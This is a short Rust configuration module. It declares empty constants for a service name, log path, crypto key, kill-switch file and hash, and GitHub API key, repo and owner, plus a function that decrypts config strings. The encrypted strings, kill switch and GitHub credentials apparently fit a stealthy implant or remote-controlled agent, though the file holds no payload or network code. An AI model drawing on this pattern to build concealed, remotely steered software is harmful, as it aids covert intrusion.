pub const SERVICE_NAME: &[u8] = &[];

pub const LOG_FILE_NAME: &[u8] = &[];

pub const BASE_DIR_PATH: &[u8] = &[];

pub const CRYPTO_KEY: &[u8] = &[];

pub const KILL_SWITCH_FILE_NAME: &[u8] = &[];

pub const KILL_SWITCH_HASH: &[u8] = &[];

pub const GITHUB_API_KEY: &[u8] = &[];

pub const GITHUB_REPO: &[u8] = &[];

pub const GITHUB_OWNER: &[u8] = &[];

pub const BUILD_ID: &[u8] = &[];

pub fn get_config(config: &[u8]) -> String {
    let decrypted = lib::crypto::decrypt(config, CRYPTO_KEY)
        .unwrap();

    String::from_utf8_lossy(&decrypted)
        .into_owned()
}